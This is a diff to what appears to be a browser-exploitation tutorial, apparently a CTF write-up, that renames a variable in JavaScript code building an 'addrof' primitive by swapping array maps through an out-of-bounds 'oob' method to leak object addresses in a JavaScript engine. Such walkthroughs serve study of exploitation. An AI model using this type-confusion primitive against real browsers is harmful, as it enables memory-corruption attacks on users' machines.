@@ -353,23 +353,23 @@ For now, we can add these to our `exploit.js` script as the `addrof` and `fakeob
 ```javascript
 /// Construct addrof primitive
 var temp_obj = {"A":1};
-var temp_obj_arr = [temp_obj];
+var obj_arr = [temp_obj];
 var fl_arr = [1.1, 1.2, 1.3, 1.4];
 var map1 = obj_arr.oob();
 var map2 = fl_arr.oob();
 
 function addrof(in_obj) {
     // First, put the obj whose address we want to find into index 0
-    temp_obj_arr[0] = in_obj;
+    obj_arr[0] = in_obj;
 
     // Change the obj array's map to the float array's map
-    temp_obj_arr.oob(map2);
+    obj_arr.oob(map2);
 
     // Get the address by accessing index 0
-    let addr = temp_obj_arr[0];
+    let addr = obj_arr[0];
 
     // Set the map back
-    temp_obj_arr.oob(map1);
+    obj_arr.oob(map1);
 
     // Return the address as a BigInt
     return ftoi(addr);
